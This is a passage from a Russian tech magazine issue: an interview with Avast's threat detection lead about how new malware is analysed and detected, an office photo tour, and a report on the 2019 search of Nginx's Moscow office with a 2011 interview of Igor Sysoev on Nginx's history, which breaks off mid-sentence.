  С 2015 года атаки хактивистов сократились на 95%


  С июля по сентябрь 2019 года Google отправила более 12 тысяч пре дуп реждений, опо вещая
   пользователей о «правительственных» атаках


  Рынок интернет‐пиратства в России показал пер вое падение за пять лет: его объем сос‐
   тавил 63 500 000 долларов
HEADER





 АНТИВИРУСНЫЕ
     БУДНИ
         КАК АНАЛИТИКИ AVAST
     ДЕТЕКТИРУЮТ НОВЫЕ УГРОЗЫ





В конце октября компания Avast про вела
мероприятие CyberSec & AI, в честь которо‐
го в штаб‐квартиру компании в Пра ге были
приг лашены журналисты из разных стран. Я
тоже посетил это мероприятие и посмотрел       Андрей Письменный                                                                                      Главный редактор
на то, как делают зна менитые на весь мир         apismenny@gmail.com
антивирусные продукты. А одной из наибо‐
лее интересных бесед был рассказ главы
группы  детектирования   угроз  Михала
Салата о том, как в Avast работа ют с мал‐
варью.


             INFO

                     Читай также ин тервью с CISO компании Avast
                    Джайлой Балу, где она рассказала о недавней
                         атаке и о том, как непросто в таких случаях пол‐
                      ностью лик видировать последствия.


Живой иллюстрацией к этой беседе стало табло из полутора десятков
мониторов, которое висит на стене в отделе Михала и демонстрирует разные
показатели, связанные с детектирова нием мал вари и обновлением анти‐
вирусных баз. Мы прошлись по наиболее интересным графикам и обсудили
связанные с ними реалии.





— Расскажите, чем каж дый день занимается ваш отдел?
— Наша ежедневная работа — это идти в интернет и искать новые виды мал‐
вари, новые техники, которые экс плуатируются атакующими, и защищать
наших пользователей при помощи детектирования и прочих активных мер.
Мы должны не отставать, а еще лучше — быть немного впе реди атакующих
и знать, как именно они используют (или лома ют) технологии.


— Как имен но про исхо дит про цесс сбо ра сэмплов?
— В первую очередь это анализ файлов. Если мы детектировали малварь и у
нас нет для нее никаких меток, мои ребята заг ружа ют ее в дебаггер и начина‐
ют разбирать, что она делает, какие API вызыва ет.


— Какие дебаггеры вы используете?
— Преимущественно IDA Pro, мы закупи ли лицензии на него. Некоторые
предпочитают x64dbg или WinDbg, но все зависит от того, с чем именно
понадобится работать и кто с чем лучше зна ком.


— Hydra еще не про бовали?
— Некоторые ребята смот рели его, и оста лись очень довольны тем, что его
можно приспособить для необычных процес сорных архитектур. В частности,
один из наших иссле дова телей использовал эту возможность, чтобы решить
CTF. Вообще я за то, чтобы каж дый при менял в работе те инструменты и спо‐
собы, которые ему удоб ны. Некоторые, например, могут почти всегда обхо‐
диться статическим анализом, другие предпочита ют динамический. Я ста‐
раюсь не настаивать на чем‐то определенном в таких случаях.


— После того, как вы получили файл, и узнали, что он делает
и как работает, какой сле дующий шаг?
— Следующий шаг — найти характерные признаки, которые поз волят детек‐
тировать эту малварь. Это могут быть адреса серверов C&C, ключи, какие‐то
другие признаки, характерные для используемых способов коммуникации.
У нас есть два типа правил — одни для бэкенда, они помогают маркировать
мал варь, другие — правила детектирования для эндпоинтов, они уже работа‐
ют на компьюте рах пользователей. При чина такого разделения в том, что
вирусописатели всегда проверяют свою малварь на всех доступных анти‐
вирусах, чтобы снизить вероятность детекта. Поведенческий анализ, который
работает у нас в облаке и недос тупен по запросу, тоже дает дополнительное
небольшое преимущество.


— Пока я сто ял здесь, я раз глядывал ваше таб ло. Сначала решил,
что оно по большей части декоративное, но чем больше смотрел,
тем инте реснее становилось. Не могли бы вы устро ить неболь-
шой тур и рассказать, какие графики наибо лее полез ны в реаль-
ности?
— Я все же вынужден признать ся, что таб ло действительно больше декора‐
тивное, потому что для всей этой информации нас троены оповещения. Если
что‐то пойдет не так, то человек, который отвечает за эту вещь, быстро узнает
о произошедшем. Вот, например, можно увидеть, что были проблемы
с выходом апдейта, и понадобилось 10 минут для их устранения.





  График Streaming Updates — слева внизу, StatsSubmits connections,
  который мы тоже затронули, — второй сверху в правом столбце

Вообще, потоковые обновления (streaming updates) — это фактические
небольшие пакеты данных, которые мы получаем при детектировании мал‐
вари . Мы тестируем каждый детект и проверя ем, будет ли он работать на тех
файлах, на которых должен, и не задева ет ли что‐то, что мы считаем чистым.
Каждая колонка со знаком плюса здесь озна чает добавленные срабаты вания,
а с минусом — удаленные. Удаляем мы их тогда, когда узнаем о ложнополо‐
жительном срабатывании или о том, что правила накладываются друг на дру‐
га. Колонки UR — это, например, детект по URL. Если мы убеждаемся, что
сервер больше не распростра няет малварь, мы уда ляем из базы его адрес.
   Графики сверху — говорят о поддержке ста рых версий. Мы поддерживаем
многие версии Windows, которые уже объявлены устаревшими или скоро
пополнят этот список. Там работа ют старые версии Avast. Мы, конечно,
не рассчитываем на то, что все всегда будут обновляться на новую версию
с ее выходом. Поэтому мы следим в том числе и за их работой.
   Дальше мы видим размер VPS (так мы называем антивирусную базу)
для разных версий. Мы ста раемся по возможности уменьшать ее.


— Как вы это го достигаете?
— Если новое правило более широкое или более эффективное, мы исклю‐
чаем старые, более узкие пра вила. Дважды в день выходит полное обновле‐
ние базы. Например, если кто‐то уехал на канику лы и потом вернулся, он
получит обновление в наиболее компактном виде.


— Что про изош ло вот здесь в 8:20, график StatsSubmits
connections?
— Мы выпустили обновление базы с эвристичес кими правилами, которые
направле ны на поиск чего‐то конкрет ного. Соответственно, выросло число
соединений, поступающих от клиентов, которые нам сообщают о находках.





— А вот эти три раз ноцветные панели что означают?
— Это штука, которую мы называем Cyber Capture, это сканер, который
работает у нас на бэкенде. Мы его используем для самых новых файлов. Если
пользователь — это первый человек во всем мире, который запускает этот
файл, мы ему предлагаем отпра вить этот файл на ана лиз. Если он согласится,
то мы можем проверить поведение в контролируемом окружении и понять,
что это такое. Зачастую новые файлы — это либо апдейты софта, которые
скоро увидят и другие пользователя, либо малварь. В таком слу чае ты
можешь быть единствен ным,  кто  видит  эту  конкретную версию, либо
это началась новая кампания.


— А номер — это..
— Это хеш. Номера здесь берутся из OdinBox. Это средс тво на основе
машинного обучения, которое клас теризует фай лы, чтобы найти закономер‐
ности. Номер здесь — это версия клас териза ции. Например, вот это версия
номер 83. Второй номер — номер клас тера, то есть группы файлов. Тре тий
номер — это тип клас териза ции, который мы использовали для создания
модели. У нас есть нес колько моделей, и мы их сменяем время от времени.
Цветовое разделение здесь означает разные варианты решений при детек‐
тировании. Зеленые — «чистые» файлы, красные — малварь. Вот этот боль‐
шой красный квадрат — это явно малварь одной группы, раз она объеди нена
в один кластер. Кстати, явно что‐то необычное, потому что клас теры вирусных
семейств чаще всего имеют примерно одинаковый размер.


— Это не червь Brontok из вот того графика?
— Нет, это будет что‐то новое, потому что клас теры — только по новым видам
файлов. Что до желтого квадрата, то это подоз рительные файлы. Либо
какие‐то инсталляторы, которые пытаются что‐то протащить в систему, либо
утилиты из «серой зоны», которые можно считать или не считать мал варью
в зависимости от точки зрения. Пользователь в таких случаях сам решает,
как ему поступить.

— Раз уж мы загово рили о вот этих хит‑парадах мал вари (Top de-
tections и Top malware files), расскажите, в чем раз ница меж ду
ними.
— Они основаны на двух раз ных метриках. Top detections — это признаки,
по которым выяв лена малварь. Например, CVE‐2017‐0144 — это уязвимость
Eternal Blue, и она часто встречается несмотря на то, что многие компьютеры
уже запатчены. И все равно мы видим много уяз вимых машин и зараже ний.
Как мы видим, прямо сейчас — более двух миллионов попыток. Популярность
в колонке рядом — это наша метрика, которая позволяет понять, нас колько
часто статистически встречают ся инциденты с тем же названи ем детекта.
А строки с одинаковыми названиями (например, Mandang) мы видим, потому
что технически детекты на основе разных признаков считаются разными.





Второй топ, Top malware ﬁles основан на фай лах. Один детект может пок‐
рывать несколько файлов и наобо рот — один файл может вызывать несколь‐
ко детектирований. Так что это просто слегка дру гой способ смотреть на то
же самое.





Цветные квадратики здесь — это визу альное представление хеша файла, так
проще работать с ними. Те же графики, кста ти, доступны с компьютера, и там
можно кликнуть по хешу и пос мотреть подробнос ти: как часто мы видим этот
файл, как много пользователей с ним сталкиваются, когда мы его увидели
впервые и прочую статис тику и ссылки на полезные вещи вроде результатов
динамического анализа.
  Колонка Prevalence — это как раз число пользователей, у которых был этот
файл. Например, вот  эту адварь RelevantKnowledge попытались запус‐
тить 903 тысячи поль зователей. Но иногда это очень маленькие цифры. Нап‐
ример, вот тут мы видим единицу в гра фе Prevalence и 262 в графе Popularity,
это значит, что какой‐то пользователь безуспешно пытал ся открыть этот
файл 262 раза. Часто люди просто продолжают кликать на файл, потому что
не понимает, почему антивирус не дает его запускать (хоть он, конечно,
показывает сообщение об угро зе). Но бывает, что пользователь не верит
или думает, что скачал файл из доверенного источника и все дол жно быть
нормально.


— Перехо дим к главной показу хе. Вот это таб ло с картой, где
показано кто и кого атакует в реальном вре мени. Насколько
это показательно в реальности?
— Ну да, карта и вот этот земной шар, конечно, выглядят наиболее круто.
В реальности это данные только одного движка, самого первого уровня
защиты. То есть то, что мы блокиру ем еще до того, как оно проникает
на компьютер. Это срабатывания Web Shield, которые происходят, когда мы
заранее знаем, что файл вредоносный. По цвету линий заметно, что большая
часть — это заблокированные URL. Для нас это наиболее эффективный под‐
ход: если мы видим, что файл приходит по одной и той же ссылке, мы бло‐
кируем ее. Кстати, если бы мы показали на этом экране все угрозы, то он
был бы просто плотно покрыт линиями.
  Еще тут видно другие типы информации. Например, кру ги — это Wi‐Fi In‐
spector находит уязвимости в беспроводных сетях пользователей. Это, кста‐
ти, не включает слабые пароли, которые сейчас являются проблемой номер
один в мире IoT. А квадраты — это вредонос ные приложения для Android,
которые мы детектировали благода ря Avast Mobile Security.


— Мож но ли сказать, что вот это все вам не дает расслабиться
никогда? Всегда ведь что‑нибудь да про исхо дит, вряд ли эти таб -
лицы и эти карты вдруг станут пустыми и вы займетесь улуч -
шениями и оптимизацией.
— Ни о каком покое, конечно же, мечтать не приходится. Но бывают более
тихие моменты — например, во время новогодних каникул — от Рождества
и примерно до конца января вирус ных кампаний меньше обычного.


                    AvastЭкскур сия по офи су
Пройтись по такому офису и не пофотографировать было решительно невоз‐
можно, поэтому, приглашают тебя на небольшую экскурсию.
   Вот так здание выглядит сна ружи (официальный снимок Avast).





А вот ресепшн на этаже. На снимке плохо видно, но на его переднюю сторону
проецируется анимация с Пакманом.





Зона отдыха с диваном и столика ми.





И вид из окна на Прагу — на зависть многим офисным работникам.





Библиотека.





Гамаки.





Зона для тех, кто любит более активный отдых.





Буфет — сердце любого офиса.





Музейный экспо нат — компьютер, на котором когда‐то была создана первая
антивирусная программа основателей Avast. На стекле напечатан код вируса
Vienna, который она детектила.





По стечению обстоятель ств мне в кадр ни разу не попали сидящие за компь‐
ютерами и напряженно работа ющие люди. Отчасти — потому что дело было
ближе к вечеру, но и в это время работа в реальнос ти еще идет.
  А вот снимок из лаборатории IoT, которую недавно открыли в Avast.





Но это, как говорится, уже совсем другая история.
HEADER



                     ИГОРЬ СЫСОЕВ
                  О РАЗРАБОТКЕ
                     ЗНАМЕНИТОГО
                        ВЕБ‐СЕРВЕРА



         КАК
   СТАРТОВАЛ
       NGINX




12 декабря 2019 года в москов ском офисе разработчиков
Nginx прошел неожидан ный обыск, о котором вначале стало
известно благодаря опубликованному в Twitter сообщению
сотрудника Nginx Игоря Иппо лито ва. И хотя оригинальное
сообщение вскоре было уда лено, так как Ипполитова «нас‐
тойчиво попросили», твит и приложенные к нему фото пос‐
тановления о производстве обыска заметили и сохранили
другие поль зователи, поэто му документ можно  увидеть
ниже.





Как видно из текста постановления, обыск проводился в связи с возбужден‐
ным уголовным делом по час тям «Б» и «В» статьи 146 УК РФ («Нарушение
авторских и смежных прав», пункты «в особо крупном размере» и «группой
лиц по предварительному сговору или организованной группой»). В итоге
разработчикам и основателям Nginx грозит не толь ко потеря проекта, но и
до шести лет лишения свободы.
   Суть пре тензии «Рамблера» сос тоит в том, что некие «неус тановленные
лица», в рабочее время и по приказу руководс тва компании, не поз‐
днее 4 октября 2004 года соз дали «программу для ЭВМ „энджи никс“»,
а затем, «имея умысел на нарушение авторских прав», опуб ликовали ее
в Сети и принялись распространять, заявляя, что права на нее принадлежат
исключительно Иго рю Сысоеву — основателю и разработчику Nginx, быв‐
шему сотруднику «Рамблера».
  «Мы обнаружили, что исклю читель ное право компании „Рамблер Интернет
Холдинг“ на веб‐сервер Nginx нарушено в резуль тате действий третьих лиц.
В связи с этим "Рамблер Интернет Холдинг" усту пила права на предъ явление
претензий и исков, связанных с нарушением прав на Nginx, компании Lyn‐
wood Investments CY Ltd, которая обла дает необ ходимыми компетенциями
для восстановления спра ведливос ти в вопросе о принадлежности прав», —
сообщили в пресс‐службе Rambler Group.
  Издание «Коммерсант» отмечает, что компания Lynwood Investments свя‐
зана с совладельцем Rambler Group Александром Мамутом — в частнос ти,
через  эту  компанию  биз несмен  владел  бри танской  книжной  сетью
Waterstones.
  В Rambler Group оценивают свой ущерб по состоянию на 2011 год
в 51,4 миллиона рублей.
  Напомним, что в 2011 году Игорь Сысоев покинул «Рамблер» и основал
компанию Nginx, которая, помимо сво бодного ПО, стала предлагать ком‐
мерческие продукты. В нас тоящее время Nginx — это один из самых популяр‐
ных веб‐серверов в интернете, с использованием его работает почти чет‐
верть всех сайтов.
  Уже к 2018 году выручка Nginx сос тавляла 26 миллионов дол ларов, и в
марте 2019 года Nginx за 670 миллионов долларов приобрела компания F5,
один из мировых лидеров в области мультиоб лачных сервисов. Команда раз‐
работки проекта, включая его осно вателей Игоря Сысоева и Максима
Коновалова, продол жила работу над Nginx уже в сос таве F5.


Что об этом говорят
Сообщество и российская ИТ‐индустрия отреагировали на происходящее
с Nginx очень бурно, и многие сочли эти события крайне плохим знаком
для российского интернет‐биз неса. Мы соб рали некоторые важные реакции
и комментарии.
  Директор  по  распространению  технологий  «Яндекса»  Григорий
Бакунов aka Bobuk поддержал Сысоева и опуб ликовал от лица компании
официальное заявление, озаглавленное «Open source — наше всё».
  Игорь Ашманов, занимавший должность исполнительного директора
Рамблера в начале нулевых, за являет, что не видит перспектив для данного
дела. «Никаких служебных заданий, предписыва ющих разрабаты вать такой
веб‐сервер, не было», — утвержда ет он. Более того, по словам Ашманова,
при найме на работу с Сысоевым было специально оговорено, что у него
есть свой проект, которым он имеет пра во занимать ся. Поэтому изложенную
в материалах уголовного дела версию он считает «чушью».
  Основатель Habr Де нис Крюч ков пишет в Twitter, что «по странному сте‐
чению обстоятельств [эту] историю достали после захода Сбера в Рамблер»,
имея в виду, что в текущем году в акционерной структуре Rambler Group про‐
изошли изме нения: в августе Сбербанк закрыл сделку по покупке 46,5% ком‐
пании. Также Крюч ков на поминает, что сайты мвд.рф и kremlin.ru тоже исполь‐
зуют в работе Nginx.
   Глава провайдера Diphost и владелец телеграм‐канала «Эшер II» Филипп
Кулин пишет: «В nginx вло жено боль шое количес тво кода сторонних людей.
Если Рамблеру чудом удастся обнулить свободную лицензию, люди гипоте‐
тически смогут потребовать уда лить их код из nginx, так как не передавали
исключительных прав Рамблеру. И такие найдутся. Сам факт тяжб будет
делать продукт ток сичным. А выигранные спо ры — превратят его в кирпич 15‐
летней давности. В мире ничего не изменится. Скорее всего, решение
локального суда будет там признано политически анга жированным».
  Американская компания F5 Networks , купившая Nginx в этом году, под‐
твердила факт обыска в мос ковском офисе компании, но не уточнила никаких
деталей. «Ранее сегодня рос сийская полиция пришла в мос ковский офис Ng‐
inx. Мы все еще собираем факты по это му вопросу, поэтому у нас нет никаких
комментариев, которые мож но дать в нас тоящее время», — заявили в F5
Networks.


Еще в 2011 году тогдашний главный редактор «Хакера» Сте па Ильин брал
интервью у Иго ря Сысо ева, и уже тогда спра шивал его, не возникнет ли
у «Рамблера» вопросов относитель но авторских прав и удалось ли Игорю
сохранить права на пакет за собой. Игорь ответил, что все в полном порядке,
разработку Nginx он начинал еще до работы в Рамблере, а продукт с самого
начала выпускался под лицензией BSD, как открытое программное обес‐
печение.


— Игорь, расскажите, как стро илось ваше образование, как приш -
ли к программированию и вооб ще увлеклись компьюте рами.
— Я родился в Казахста не в малень ком городке. Когда мне было около года,
моего отца (он военный) перевели в Алма‐Ату, и я жил там до 18 лет.
В 1987 году я окончил школу и поехал поступать в МВТУ имени Баумана,
однако с первого раза пос тупить не удалось, и я вернулся назад в Алма‐Ату,
где устроился работать лаборантом в филиал Института повышения квалифи‐
кации  Министерства  геоло гии СССР.  Там  были  старые  компьюте ры
«Искра‐226», на них я и начал что‐то программировать на бей сике.
  А еще в то время в журнале «Радио» была опуб ликована серия статей,
как собрать собственный компь ютер «Радио‐86РК», и благодаря их чтению
у меня сложилось достаточно неплохое представление, как компьютер устро‐
ен и как он работает. А первый опыт работы с компь ютерами был чуть рань‐
ше: в старших классах я ходил во Дво рец пионеров, и там поставили компь‐
ютеры Yamaha КУВТ (стандарта MSX). Помню, когда набирал первую прог‐
раммку, перепутал единицу с буквой I. В общем, она у меня не работала из‐за
таких вещей.


— А помните свою первую программу, которой пользовались дру -
гие люди?
— Моя первая крупная и отчужда емая прог рамма — это антивирус AV,
который я написал в 1989–1990 годах. Написан он был пол ностью на ассем‐
блере, объем ассемблерного кода был где‐то порядка 100 Кбайт. Программа
умела находить несколь ко вирусов, имея зашитую внутрь программы базу
с несколькими сигнатурами известных тогда в СССР вирусов, которых было
от силы штук десять: вирусы «Марихуана», «София», «Вена» и еще несколько,
не помню их названий. Вот это и была моя первая программа, которую я рас‐
пространял в бинарниках — исходников я тогда не раздавал. В итоге она
разошлась по стране, была установлена даже на нескольких заводах. Была
и обратная связь: люди по почте слали письма с вирусами, записанными
на дискеты. Какое‐то время я поддержи вал данный антивирус, но в итоге году
в 1992‐м я уже потерял интерес к этой теме, и программа умерла.
  В 1994 году я окончил институт, а за год до этого начал работать сис‐
темным администратором в одной компании, которая была связана с тор‐
говлей нефтепродуктами. Там я проработал почти семь лет, пос ле чего
в апреле 2000 года я решил уйти. Тог да как раз сдулся NASDAQ, лопнул
«пузырь доткомов», и как раз в этот момент я решил уйти в интернет. Полгода
я проработал в интернет‐магазине XXL.RU, после чего, как сей час помню,
13 ноября 2000 года я пришел работать в Рамблер.


— Чем вы занимались в Рамбле ре?
— Я работал системным администра тором. Одна ко кроме непосредственной
работы сисадмина я снова начал в свободное время писать программы. Надо
отметить, что в мои должностные обязанности прог рамми рование не вхо‐
дило, но поскольку были время и тяга, то первое, чем я занялся, — адап‐
тировал патч для сжатия ответов Apache. К сожалению, на тот момент имя
mod_gzip было уже занято, поэто му я наз вал свой вари ант mod_deﬂate,
работал он с Apache 1.3.
  Потом меня попросили разобраться с модулем mod_proxy. Я его пос‐
мотрел и решил, что проще написать все с нуля, чем адаптировать там
какие‐то вещи. Таким образом появился модуль mod_accel — модуль и набор
патчей для Apache для реверсного проксирова ния. Это все тоже было вес‐
ной 2001 года.


— То есть все эти модули вы делали для Рамбле ра, одновре мен -
но вык ладывая в паб лик?
— В основном да. Mod_deﬂate на самом деле пришел из патча, который
писал Дмитрий Хрусталев, работая в РБК. То есть этот патч был взят за осно‐
ву, там моего кода, может, половина только.
  Осенью 2001 года у меня появилась идея написать более легкий и про‐
изводительный веб‐сервер, чем Apache. На тот момент были уже другие
похожие серверы, но все они не умели проксировать, они отдавали только
статику. Был у них еще один общий недос таток — они работали в одном про‐
цессе, и, соответственно, отмасшта бировать их, допус тим, на двухпроцес‐
сорной машине было нереально.
  На  тот момент  у меня уже был дос таточно неплохой опыт работы
с Apache — и как у системного администратора, и как у программис та. Два
написанных модуля прибавили мне знаний: приходилось смотреть исходники
Apache и понимать, как там все устроено. Поэто му очень многие вещи в Nginx
перекочевали из Apache идеологичес ки. Не код, а именно идеология, весь
код Nginx был написан с нуля.
  Однако не все мне нра вилось в Apache: например, там очень легко можно
сделать такую конфигурацию, которую будет край не сложно поддержи вать.
То есть сайт растет, добавляется какая‐то новая функциональность, и в конце
концов работать с сайтом становится невоз можно. Нужно что‐то добавить,
и ты сидишь, думаешь: «А что у меня сломается от того, что я добавлю?»
В Nginx я попытался этих вещей избежать. В общем, где‐то весной 2002‐го я
начал разрабатывать Nginx.


— Быстро ли о ваших раз работках узнали внеш ние по отно шению
к Рамбле ру люди? Как эво люционировал про ект?
— В 2003 году про мои разработ ки прознали снаружи Рамблера, и, более
того, Nginx начал исполь зовать ся на нес кольких сайтах. Первым был эстон‐
ский сайт знакомств Rate.ee, который и сейчас существует. Это, кстати,
самый высоконагруженный сайт Эстонии. Потом Nginx начал использоваться
на mamba.ru и на zvuki.ru, где раз давал MP3.
  В начале 2004 года Рамблер запус кал сервис foto.rambler.ru, и один
из кол лег, Олег Бунин, попросил меня доделать в Nginx функциональность
проксирования запросов, чтобы начать полноценно использовать его в том
числе на фотосервисе Рамблера. До этого момента проект был достаточно
академическим, я его пос тепенно писал, но это мог ло никогда ничем не кон‐
читься, то есть в продакшн его, может быть, нигде и не поставили бы.
В общем, получилось так, что я срочно доделал и проксирование. И где‐то
в начале 2004 года появилась версия с проксированием, а сервис foto.ram‐
bler.ru заработал на базе Nginx.
   4 октября 2004 года, в очередную годовщину запуска первого космичес‐
кого спутника, я выпустил первую публичную версию: 0.1.0.


— Сейчас доля Nginx растет очень быстро, а как дело было
в самом начале?
Сейчас он действительно растет достаточно быс тро. Вначале все было
заметно скромнее. В первый год наибольшую популярность Nginx по очевид‐
ным причинам набирал в России. В дальнейшем про Nginx узнали и за ее
пределами, и отдельные энту зиасты начали его использовать на свой страх
и риск. Появился англоязычный список рассылки, стали появляться сторон‐
ние ресурсы, описывающие Nginx, люди присылали мне все больше пожела‐
ний и замечаний, я вносил исправления, про дукт пос тепенно набирал
популярность. Сейчас проект действитель но рас тет очень быстро, и это стало
одним из поводов для создания компании. В одиночку я уже просто перес тал
справляться.


— Так что, никако го прод вижения вооб ще не было, получается,
про дукт сам себя сде лал?
С моей стороны никакого специального пиара не было. Хотя есть такое мне‐
ние, что лучший пиар — это прос то хороший про дукт. То есть весь рост обус‐
лавливался тем, что Nginx «прос то работал» и люди рассказывали о своем
положительном опыте знакомым админам, те — своим знакомым, и так
по принципу сарафанного радио. Популярность Nginx, на мой взгляд, свя зана
с несколькими вещами. Во‐первых, это эффективный и бесплатный софт,
который позволяет существенно эко номить аппа рат ные ресурсы и денежные
средства, во‐вторых, он в принципе неплохо работает.


— Но есть же аналоги, lighttpd тот же самый например.
— На самом деле есть еще пара причин: получилась довольно инте ресная
комбинация   жизненно   важных  фич   для   создания   эффективной
веб‐инфраструктуры, которые я добавлял постепенно и которые сделали Ng‐
inx таким незаменимым инстру ментом. При этом Nginx не перегружен ненуж‐
ными фичами и остается очень компактной разработ кой. Кроме того, модуль‐
ность Nginx позволила многим компаниям и сторонним разработчикам стро‐
ить свои расширения на базе ядра Nginx. Можно сказать, что Nginx давно
стал в своем роде веб‐платформой.
  По поводу lighttpd (lighty). Когда‐то он был более рас пространен, чем Ng‐
inx, и более известен в мире. Его автор — немец Ян Кнешке (Jan Kneschke).
Разница в популярности была свя зана с тем, что Рос сия — непонятная страна
с балалайкой и медведем, снегом, а тут Евро па. Опять же, и с английским
у него лучше было, в том числе и с английской документацией.
   Кстати, благодаря  lighttpd обрел второе дыхание протокол  FastCGI.
До 2000–2001 года это была экзо тика, все использовали интерпре таторы,
которые были внутри Apache: PHP,  Perl, Python. А поскольку в  lighttpd
исполнять внутри процес са PHP‐код нереально, то решением стал FastCGI.
И  именно  благодаря   lighttpd  FastCGI  обрел  вторую  жизнь.  Хотя
еще в 2000 году люди говорили: «Зачем, что это такое — FastCGI? У нас есть
mod_php, и там все прекрасно работа ет».





                                     Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
 КАК СТАРТОВАЛ NGINX
                    ИГОРЬ СЫСОЕВ О РАЗРАБОТКЕ
                    ЗНАМЕНИТОГО ВЕБ‐СЕРВЕРА





— Какие главные кейсы использования Nginx вы видите сейчас?
— Основное использование на нагруженных сай тах — это проксирование.
При этом Nginx установ лен в качестве фронтэнда и проксирует приложения
на бэкэндах по HTTP либо по FastCGI или WSGI. При этом стандартным под‐
ходом является использование в связ ке с Apache — например, на моем пре‐
дыдущем месте работы Nginx долгое время работал именно так, только пару
лет назад переключились на использование FastCGI. Кстати, в этом случае
в статистике отобража ется, что появляется Nginx, пропадает Apache. Хотя
на самом деле исполь зуется и то и другое: просто Nginx является одним
из компонентов прок си‐системы, видимым снаружи.


— Объ ясните наглядно, зачем вооб ще прок сировать запросы?
— Почему, собственно, люди используют Apache с Nginx? Казалось бы, зачем
тут лишнее звено, которое будет мешать. Apache хорошо и легко исполь‐
зовать  там,  где  нужно  выполнение  какого‐то  приложения,  например
с помощью mod_php. Вот теперь представь те себе, что этот PHP способен
генерировать 100 ответов в секунду, а каж дый ответ имеет размер, условно,
100 Кбайт. Не все клиенты используют быстрые соединения: 10 лет назад
были модемные клиенты, сейчас очень рас пространен мобильный интернет,
у кого‐то просто пло хой провайдер или медленный тариф.
  И вот у нас есть ответ объемом 100 Кбайт и эффективная скорость к кли‐
енту, например 80 Кбит/с (10 Кбайт/с). Значит, этот ответ будет передаваться
клиенту 10 секунд. В результате все это время, пока клиент медленно ска‐
чивает ответ, Apache вмес те с PHP «жрет» 10–20 Мбайт памяти на одного
клиента. И вместо того, чтобы занимать ся тем, что Apache может делать быс‐
тро, он ждет, пока медленные клиенты заг рузят ответы. На все это расходу‐
ется очень много памяти, да и процес сор тоже.
   Когда мы ставим Nginx между клиентами и Apache, то все начинает
работать эффективнее: Nginx максимально быс тро принимает на себя весь
ответ, освобождая Apache, и потом уже медленно отдает его клиентам,
не расходуя много памяти. Много памяти или процессора Nginx не расходует,
потому что используется другая архитектура веб‐сервера — неблокируемая,
основанная на асин хронной обработке событий, что позволяет обрабаты вать
многие тысячи соединений в рамках одного про цес са (в отличие от Apache,
где каждое соединение обра батывается отдель ным процес сом или тре‐
дом. — прим. ред.).
   Ну и плюс к этому мы можем с бэкэнда вынести все статические файлы,
это простая вещь, с которой Nginx может спра виться очень легко и мак‐
симально эффективно — таких статичес ких файлов Nginx может отдавать
одновременно десятки тысяч в секунду, если память позволяет и если поз‐
воляет сетевое соединение с сервером.


— Давайте вернемся к типовым сце нариям.
— Итак, первый сценарий — это ког да мы просто занимаемся акселерирова‐
нием, может быть, даже одного‐единственного сай та. У нас был Apache, мы
поставили перед ним Nginx, и — бах! — случилось чудо. Люди реально ставят
и удивляются, а потом пишут на «Хабр» о том, что «надо же, как кле во». Вто‐
рой вариант — это тоже проксирование, но у нас много бэкэндов, то есть мы
можем эффективно масшта бировать горизонтально всю систему при усло‐
вии, что само приложение это поз воляет. Таким образом, Nginx выступает
в роли балансировщика нагрузки.
  Одним из недостатков текущей реализации является отсутс твие нес коль‐
ких политик балансировки, но люди пользуются, это работает, а функционал
мы будем добавлять. Что еще? Еще сценарий, например, такой: многим
людям почему‐то Apache не нравит ся. Хотят, чтобы на сервере был только
Nginx, не хотят ставить Apache. В этом случае все скрипты у них работают
через FastCGI для PHP или WSGI для Python.
  Например, WordPress.com — они давным‐давно начали использовать Ng‐
inx в качестве балансировщика, а веб‐сервером у них выс тупал коммерческий
LiteSpeed. В этом году они уже полностью мигрировали на Nginx, теперь у них
PHP работает в режиме FastCGI.
  Другой стандартный вариант использования — когда Nginx прос то отдает
всю статику, допустим MP3, FLV‐, MPEG4‐видео, картинки.


— Давайте немного погово рим про безопасность. Были ли за вре -
мя существо вания Nginx какие‑либо серьезные уяз вимости?
— Уязвимости были разные, но проб лем с тем, чтобы с их помощью получить
удаленный доступ, код выполнить, — такого не было. Можно было ронять
рабочие процессы, но вот именно исполнить код — таких уяз вимостей
не было. Смотрите, обычно экс пло ит рассчитан на что? Мы чего‐то записали
в сервер, ему это дело упа ло на стек. Сервер работает, делает воз врат
и попадает на этот код.
  Соответственно, чтобы экспло ит заработал, надо знать, где стек будет
у этого процесса. Как правило, когда есть какой‐нибудь пакет Debian/Ubuntu,
есть бинарник, можно воспроизвести у себя аварийную ситу ацию, попытать‐
ся найти, где находится этот стек, и таким обра зом сделать экс плоит. Как ста‐
ли с этим бороться? Стали рандомизировать адресное пространс тво —
в современной вин де, например, это так работа ет.


— ASLR?
— Да, верно. Это рандомиза ция. У нас стек был тут, а теперь стал вот тут. И,
соответственно, мы не можем предугадать, то есть мы взяли пакет, а понять,
где у него теперь стек, не получится. У Nginx в этом плане проще, потому что
на стеке данных, которые читаются от клиентов, практически нет. Можно
пересчитать по пальцам несколько случаев, где это используется, но в этих
местах код довольно надежен. Данные, получаемые от клиентов, Nginx раз‐
мещает «в куче», выделяя память при помощи malloc.
  Соответственно, если  туда  записать  где‐то  чуть побольше,  то мы
не попадем на указатель стека. Вот эта рандомизация в Nginx присутствовала
с самого начала. В общем, написать рабочий экс плоит если и можно, то
очень сложно. Кроме того, процес сы, которые занимаются обработкой зап‐
росов, не работают от «рута».
   Security‐advisory были, их можно пос мотреть на сайте. Я считаю, что на все
эти сообщения об ошибках нужно реагировать адекватно, спокой но и про‐
фессионально. Например, скрывать факт бага, ког да все уже опубликовано,
говорить типа «Что? Ничего не было, все хорошо» — это просто‐напросто
подрывает доверие к проекту.


— Сколько человек занималось раньше и занимается сейчас раз -
работкой, раз витием про екта?
— Дол гое время занимался я один, практически весь код я написал в оди ноч‐
ку. Года четыре назад мне стал все больше помогать Максим Дунин. Кроме
нас двоих еще по мере раз вития продукта люди при сылали патчи. Причем
часто  присылают  прос то  письма  с  тек стовым  опи санием  проблем
или пожелания. Мне говорят: «Есть ошибка, решить можно ее вот так». Прос‐
то словами. Мы это делаем по мере сил.
  Еще у нас сейчас есть отдельный человек — Руслан Ермилов, который
сейчас  занимается  документацией.  Он  выполняет  несколько  задач:
это перевод текущей русской документации на английский язык, акту али‐
зация  сведений и адаптация документации,  чтобы она была  понятна
и однозначна для людей, впервые ее читающих. Частая проблема, когда
автор пишет документацию, у него в голове есть определенный контекст, и он
отталкивается от него. Дума ет, что вот это само собой разумеется, а в итоге
упускает много деталей. С этим мы как раз активно боремся: Руслан смотрит
